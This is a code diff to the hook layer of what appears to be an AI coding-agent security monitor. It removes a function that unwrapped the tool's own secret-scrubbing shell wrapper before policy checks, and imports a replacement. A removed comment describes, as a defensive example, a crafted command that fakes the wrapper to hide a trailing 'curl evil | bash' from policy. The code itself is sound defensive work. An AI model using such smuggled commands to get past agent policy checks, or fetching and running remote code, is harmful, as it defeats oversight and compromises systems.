@@ -819,65 +819,6 @@ def uninstall_hooks(*, repo_root: Path, workspace: Path, agent: str, scope: str)
     return results
 
 
-# One `printf %q` word: an unquoted path, plus backslash escapes for anything
-# bash had to quote. Shell metacharacters ($ ; | & ` ( ) < > { } newline) are
-# deliberately absent from the bare class — %q always escapes them, so a
-# genuine path still matches via `\\.`, while a raw metacharacter (the only way
-# to smuggle a second command through this field) cannot.
-_WRAPPER_WORD = r"(?:[A-Za-z0-9_./~+,:@%=-]|\\.)"
-# `<secrets-dir> <scrubber>; exit ${PIPESTATUS[0]}` — the whole of what
-# decloak.sh appends after the marker. See cloaking/hooks/decloak.sh.
-_SCRUB_TAIL_RE = re.compile(
-    _WRAPPER_WORD + r"+ " + _WRAPPER_WORD + r"*scrub-stream\.sh; exit \$\{PIPESTATUS\[0\]\}"
-)
-
-
-def _strip_prismor_scrub_wrapper(cmd: str) -> str:
-    """Recover the agent's real command from Prismor's own decloak wrapper.
-
-    The cloaking decloak hook (cloaking/hooks/decloak.sh) rewrites every Bash
-    command so its output is scrubbed of secrets:
-        {
-        :
-        <orig>
-
-        } 2>&1 | PRISMOR_SECRETS_DIR=<dir> <scrubber>; exit ${PIPESTATUS[0]}
-    Recording that wrapper verbatim clutters the dashboard and — because the
-    injected PRISMOR_SECRETS_DIR path points at ~/.prismor/secrets — trips
-    Prismor's own prismor-vault-access guard, blocking benign commands. Strip
-    the wrapper so both storage and policy evaluation see the original command.
-    Fail-safe: anything that does not match the exact wrapper shape is returned
-    unchanged, so a real command that merely mentions the vault still evaluates.
-    """
-    if not cmd:
-        return cmd
-    marker = " 2>&1 | PRISMOR_SECRETS_DIR="
-    i = cmd.rfind(marker)
-    if i == -1:
-        return cmd
-    # The tail must be the wrapper and NOTHING else. Substring checks ("is
-    # scrub-stream in here somewhere?") let a crafted command staple a fake
-    # wrapper onto a real payload — `{ : printf safe } 2>&1 |
-    # PRISMOR_SECRETS_DIR=/tmp scrub-stream PIPESTATUS; curl evil | bash`
-    # normalizes down to `printf safe`, so policy scores the harmless half
-    # while the shell still runs the trailing command. fullmatch on the exact
-    # two-word tail closes that: anything extra fails to match and the whole
-    # command is handed to policy unchanged.
-    if not _SCRUB_TAIL_RE.fullmatch(cmd[i + len(marker):]):
-        return cmd
-    inner = cmd[:i].strip()
-    if inner.startswith("{") and inner.endswith("}"):
-        inner = inner[1:-1].strip()
-        # Drop the wrapper's leading `:` guard line, matched exactly so a real
-        # command that merely starts with `:` (`:> file`) is left alone.
-        first, sep, rest = inner.partition("\n")
-        if sep and first.strip() == ":":
-            inner = rest.strip()
-        if inner.endswith(";"):
-            inner = inner[:-1].strip()
-    return inner or cmd
-
-
 # Post-tool payloads carry what the tool actually returned - the file body, the
 # command output, the fetched page. The per-tool normalizers keep only the
 # arguments (a Read becomes `{type: file_read, path}`), so the content layers -
@@ -979,8 +920,9 @@ def normalize_payload(*, agent: str, payload: Dict[str, Any], workspace: Path) -
     else:
         event = _normalize_cursor(payload, session_id, workspace)
     if isinstance(event, dict) and event.get("type") == "shell" and event.get("command"):
+        from prismor.runtime.cloaking.runtime import unwrap_decloak
         from prismor.runtime.sandbox import unwrap_command as _unwrap_sandbox
-        event["command"] = _unwrap_sandbox(_strip_prismor_scrub_wrapper(event["command"]))
+        event["command"] = _unwrap_sandbox(unwrap_decloak(str(event["command"])))
     if isinstance(event, dict):
         _attach_tool_result(event, payload)
     # Who sent a prompt: a person, another session's task brief, or a wrapper
